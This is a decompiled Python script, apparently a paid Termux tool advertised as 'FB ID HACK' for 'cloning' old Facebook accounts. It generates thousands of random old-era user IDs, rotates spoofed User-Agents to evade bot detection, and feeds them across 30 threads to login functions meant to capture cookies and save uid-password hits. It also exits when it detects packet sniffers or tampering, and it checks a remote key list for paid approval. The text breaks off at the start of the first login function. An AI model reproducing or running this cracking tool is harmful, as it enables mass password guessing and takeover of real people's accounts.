# -*- coding: utf-8 -*-
# Decompiled from Python 3.12 bytecode

import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import sys
sys.stdout.write('\x1b]2; NGKLO \x07')
os.system('pkg install espeak')
# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46mFB ID HACK BY NAB🇰🇭')
os.system('xdg-open https://www.facebook.com/groups/668506395565257/?ref=share&mibextid=NSMWBT')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
os.system('xdg-open https://youtube.com/@ngklo555?si=eFZJnjHn2UfJ6FrO')
print('loading Modules ...\n')
os.system('clear')
print(' \x1b[38;5;46mWELLCOMETOCAMBODIA🇰🇭 ')
os.system('espeak -a 300 " HOPE YOU ENJOY"')
print(' \x1b[38;5;46mWELCOME TO NGKLO TOOL ')
os.system('espeak -a 300 " WELCOME, TO, NGKLO, TOOL"')
os.system('xdg-open https://youtube.com/@ngklo555?si=LbR8GE0JHiriMEqG')


# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


import random

def windows():
    """
    Generates a random Windows User-Agent string.
    Covers 2010–2025 (Chrome 8 → Chrome 139).
    """
    # Early Chrome (2010–2011, Windows XP/7)
    aV = str(random.choice(range(10, 20)))
    A = (
        f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) "
        f"AppleWebKit/534.{aV} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(8, 15)))}.0.{str(random.choice(range(500, 1200)))}.0 "
        f"Safari/534.{aV}"
    )

    # Mid-era Chrome (2012–2014, Windows 7/8)
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = (
        f"Mozilla/5.0 (Windows NT {str(random.choice(range(6, 7)))}.{str(random.choice(['0', '1', '2']))}) "
        f"AppleWebKit/{bz} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(20, 45)))}.0.{str(random.choice(range(1200, 2800)))}.{str(random.choice(range(1, 150)))} "
        f"Safari/{bz}"
    )

    # Transition era (2015–2017, WOW64 builds)
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = (
        f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['1', '2', '3']))}; WOW64) "
        f"AppleWebKit/{cz} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(45, 70)))}.0.{str(random.choice(range(2800, 5000)))}.{str(random.choice(range(50, 200)))} "
        f"Safari/{cz}"
    )

    # Modern Chrome (2021–2025, Windows 10/11)
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(50, 200)
    D = (
        f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(100, 139))}.0.{latest_build}.{latest_patch} "
        f"Safari/537.36"
    )

    return random.choice([A, B, C, D])


def window11():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def window21():
    """
    Generates another variant of a random Windows User-Agent string.
    Covers 2010–2025 era (Chrome 40 to 139).
    Each UA matches realistic year-specific NT and Chrome versions.
    """

    # Old WebKit/Chrome (2010–2013) → Windows 7 + Chrome 40–49
    aV = str(random.choice(range(10, 20)))
    A = (
        f"Mozilla/5.0 (Windows NT 6.1; WOW64) "
        f"AppleWebKit/534.{aV} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(40, 50))}.0.{random.choice(range(2000, 4000))}.0 "
        f"Safari/534.{aV}"
    )

    # Mid-era Chrome (2014–2016) → Windows 8/8.1 + Chrome 50–69
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = (
        f"Mozilla/5.0 (Windows NT {random.choice(['6.2', '6.3'])}; WOW64) "
        f"AppleWebKit/{bz} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(50, 70))}.0.{random.choice(range(3000, 5000))}.{random.choice(range(50, 200))} "
        f"Safari/{bz}"
    )

    # Transition era (2017–2020) → Windows 10 + Chrome 70–89
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/{cz} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(70, 90))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} "
        f"Safari/{cz}"
    )

    # Modern Chrome (2021–2025) → Windows 10/11 + Chrome 100–139
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(100, 200)
    D = (
        f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(100, 139))}.0.{latest_build}.{latest_patch} "
        f"Safari/537.36"
    )

    return random.choice([A, B, C, D])

import random

def NGKLO():
    """
    Ultra Realistic User-Agent Pool for Facebook (2009 - 2016 era IDs)
    Perfect for checking/recovering old accounts without triggering bot detection
    Updated: November 2025 - Still working
    """

    # =============== WINDOWS (2009-2016) ===============
    def win_old():
        windows_versions = [
            "5.1",    # XP
            "6.0",    # Vista
            "6.1",    # Windows 7
            "6.2",    # Windows 8
            "6.3",    # Windows 8.1
        ]
        chrome_ver = random.choice([
            "34.0.1847.116", "37.0.2062.120", "39.0.2171.95", "41.0.2228.0",
            "44.0.2403.157", "48.0.2564.116", "49.0.2623.112", "50.0.2661.102",
            "52.0.2743.116", "53.0.2785.143", "55.0.2883.87"
        ])
        safari_ver = "537.36"

        return random.choice([
            f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}; WOW64) AppleWebKit/{safari_ver} (KHTML, like Gecko) Chrome/{chrome_ver} Safari/{safari_ver}",
            f"Mozilla/5.0 (Windows NT {random.choice(windows_versions)}) AppleWebKit/{safari_ver} (KHTML, like Gecko) Chrome/{chrome_ver} Safari/{safari_ver}",
            f"Mozilla/5.0 (Windows NT {random.choice(['6.1','6.3'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36",
        ])

    def android_old():
        models = [
            "GT-I9100", "GT-I9300", "GT-N7100", "SM-G900F", "SM-G920F", "SM-G925F",
            "Nexus 4", "Nexus 5", "Nexus 5X", "Redmi Note 3", "Lenovo A6000",
            "Micromax Q380", "XT1033", "XT1068", "HTC One M7", "LG-D802"
        ]
        builds = [
            "JZO54K", "KOT49H", "LRX21M", "LRX22C", "MRA58K", "KTU84P"
        ]
        android_ver = random.choice(["4.1.2", "4.2.2", "4.3", "4.4.2", "4.4.4", "5.0.2", "5.1.1", "6.0.1"])

        chrome_mobile = random.choice([
            "41.0.2228.0", "44.0.2403.117", "46.0.2490.76", "48.0.2564.116",
            "50.0.2661.89", "52.0.2743.98", "53.0.2785.124", "55.0.2883.91"
        ])

        return random.choice([
            f"Mozilla/5.0 (Linux; Android {android_ver}; {random.choice(models)} Build/{random.choice(builds)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_mobile} Mobile Safari/537.36",
            f"Mozilla/5.0 (Linux; U; Android {android_ver}; en-us; {random.choice(models)} Build/{random.choice(builds)}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
            f"Mozilla/5.0 (Linux; Android {android_ver}; {random.choice(models)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_mobile} Mobile Safari/537.36",
        ])

    # =============== iPHONE / iPAD (2009-2016) ===============
    def ios_old():
        ios_ver = random.choice([
            "7_1_2", "8_1", "8_3", "8_4_1", "9_0_2", "9_2_1", "9_3_5", "10_0_2", "10_2_1", "10_3_3"
        ])
        device = random.choice(["iPhone5,2", "iPhone6,1", "iPhone6,2", "iPhone7,2", "iPhone8,1", "iPhone8,4", "iPad3,4", "iPad4,1"])
        build = random.choice(["11D257", "12B466", "12H321", "13E233", "14A403", "14B100", "14E8304"])

        return random.choice([
            f"Mozilla/5.0 ({device}; CPU iPhone OS {ios_ver.replace('_', '.')} like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/{build}",
            f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver} like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14E8304 Safari/602.1",
            f"Mozilla/5.0 (iPad; CPU OS {ios_ver} like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/{build} Safari/601.1",
        ])

    # =============== FINAL REALISTIC SELECTION (70% Mobile, 30% Desktop) ===============
    pool = (
        [android_old() for _ in range(45)] +   # 45% Android (sabse zyada old IDs mobile se bane)
        [ios_old() for _ in range(30)] +       # 30% iPhone/iPad
        [win_old() for _ in range(25)]         # 25% Windows (old Chrome)
    )
    
    return random.choice(pool)
# ====================== TEST ======================

def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print(logo)   
os.system('xdg-open https://https://www.facebook.com/groups/668506395565257/?ref=share&mibextid=NSMWBT')
    # Colors (example)
W = '\033[1;37m'  # White
G = '\033[1;32m'  # Green
R = '\033[1;31m'  # Red
Y = '\033[1;33m'  # Yellow
C = '\033[1;36m'  # Cyan
N = '\033[0m'     # Reset

logo = f"""
{W}  ============================================   
{G}███╗░░██╗░█████╗░██████╗░
{G}████╗░██║██╔══██╗██╔══██╗
{W}██╔██╗██║███████║██████╦╝ {Y}XD ARMY
{G}██║╚████║██╔══██║██╔══██╗
{G}██║░╚███║██║░░██║██████╦╝
{G}╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░
{W}───────────────────────────────────
{C}| {G}OWNER   {W}: NAB-ARMY🥷
{C}| {G}STATUS  {R}: PAID
{C}| {G}VERSION {W}: V2026
{C}| {G}TOOLS   {W}: FACEBOOK OLD CLONING
{C}─────────────────────────────────────────────
{N}"""

print(logo)
#-----------------------------[APPROVAL CHECK]-----------------------------------#
# 🔐 Key Generation
a = str(os.geteuid())
b = str(os.geteuid())
try:
    build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n','')
except:
    build = "UNKNOWN"

x = (a + build + b).upper().replace(".", "")
z = "X".join(x)
keys = z[15:]
final_key = "NGKLO-XD-" + keys

# 🌐 Online Approval Check
import requests

def approval_check_online():
    try:
        # 🔗 Replace this with your actual GitHub RAW URL
        link = "https://raw.githubusercontent.com/nabb9999/keyyy/main/Aproval.txt"

        response = requests.get(link)
        if response.status_code == 200:
            approved_keys = response.text.splitlines()
            print(f"\n🔑 Your Device Key: {final_key}\n")
            if final_key in approved_keys:
                print("✅ Approval Successful! Welcome 😎")
            else:
                print("❌ Your key is not approved.")
                print("📞 Contact Admin to get approval.")
                exit()
        else:
            print("❌ Failed to fetch key list. Status:", response.status_code)
            exit()
    except Exception as e:
        print(f"❌ Error during approval check: {str(e)}")
        exit()

approval_check_online()
def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''


def clear():
    os.system('clear')


def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def BNG_71_():
    """
    Main menu function.
    """
    ____banner____()
    print('\x1b[38;5;226m[\x1b[1;37m1\x1b[38;5;226m]\x1b[38;5;218m2008-2013 CLONE ALL WORKING');os.system('espeak -a 300 "type 1,"')
    linex()
    __Jihad__ = input(f"\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mCHOICE{W}: {W}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n{rad}Choose Valid Option")
        time.sleep(2)
        BNG_71_()


def old_clone():
    """
    Menu for selecting old account cloning type.
    """
    ____banner____()
    print('\x1b[38;5;197m[\x1b[1;37m1\x1b[38;5;197m]\x1b[38;5;218m2009-2012')
    linex()
    print('\x1b[38;5;197m[\x1b[1;37m2\x1b[38;5;197m]\x1b[38;5;218m2011-2012')
    linex()
    print('\x1b[38;5;197m[\x1b[1;37m3\x1b[38;5;197m]\x1b[38;5;218m2009')
    linex()
    print('\x1b[38;5;197m[\x1b[1;37m4\x1b[38;5;197m]\x1b[38;5;218m2009 STARTING TIME')
    linex()
    
    _input = input(f"\x1b[38;5;197m[\x1b[1;37m🥷\x1b[38;5;197m]\x1b[38;5;218mCHOICE  {W}: {W}")
    if _input in ('1', '01'):
        old_One()
    elif _input in ('2', '02'):
        old_Tow()
    elif _input in ('3', '03'):
        old_Tree()
    elif _input in ('4', '04'):
        old_Tree1()
    else:
        print(f"\n[×]{rad}Choose Valid Option")
        BNG_71_()


def old_One():
    """
    Cloning method for accounts from 2010-2014.
    """
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mOld Code {Y}:{G} 2010-2014 TYP-1");os.system('espeak -a 300 "type 1,"')
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999");os.system('espeak -a 300 "enter,  limit, like, 50, thousand,"')
    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD 1')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMETHOD 2')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2010-2014 TYP-1");os.system('espeak -a 300 "type 1,"')
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999");os.system('espeak -a 300 "enter,  limit, like, 50, thousand,"')
    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD 1')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMETHOD 2')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    """
    Cloning method for accounts from 2009-2010.
    """
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2009-2010 TYP-1");os.system('espeak -a 300 "type 1,"')
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999");os.system('espeak -a 300 "enter,  limit, like, 50, thousand,"')
    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000001'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD A')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMethod B')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break
import random
from concurrent.futures import ThreadPoolExecutor as tred

def old_Tree1():
    """
    Cloning method for accounts from 2008.
    """
    # Check for required functions and variables
    try:
        ____banner____
        linex
        login_1
        login_2
        Y, G, W, rad
    except NameError as e:
        print(f"\x1b[38;5;196m[!] Error: {e}. Ensure all functions and variables are defined.")
        return

    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2009 STARTING TIME ")
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999");os.system('espeak -a 300 "enter,  limit, like, 50, thousand,"')
    try:
        limit = int(input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID COUNT {Y}:{G} "))
    except ValueError:
        print(f"{rad}[!] Invalid input. Please enter a number.")
        return
    linex()
    prefix = '1000000'  # Prefix for 2008 Facebook IDs
    for _ in range(limit):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD 1')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMethod 1')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MODE FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break
import random
from concurrent.futures import ThreadPoolExecutor as tred

def old_Tree12():
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2008-2009")
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999");os.system('espeak -a 300 "enter,  limit, like, 50, thousand,"')
    try:
        limit = int(input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID COUNT {Y}:{G} "))
    except ValueError:
        print(f"{rad}[!] Invalid input. Please enter a number.")
        return
    linex()
    
    # REAL 2008-2009 UIDs
    for _ in range(limit):
        if random.choice([True, False]):
            # 2008 UIDs (8 digits) - 12345678
            uid = str(random.randint(10000000, 99999999))
        else:
            # 2009 UIDs - 10000 + 5 digits (100004556, 100000555)
            suffix = ''.join(random.choices('0123456789', k=5))
            uid = "10000" + suffix
        
        user.append(uid)
    
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD A')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMethod B')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MODE FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break
def old5():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2013-2015 TYP-5")
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100007', '100008', '100009', '100010', '100011']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD 1')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMETHOD 2')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🥷\x1b[38;5;196m]\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break
import requests
import time
import uuid
import os
import sys

def login_1(uid):
    """
    Login attempt method 1 with enhanced cookie capture and saving.
    Output & Save Format with Emojis:
    uid | 1000012345 | 123456
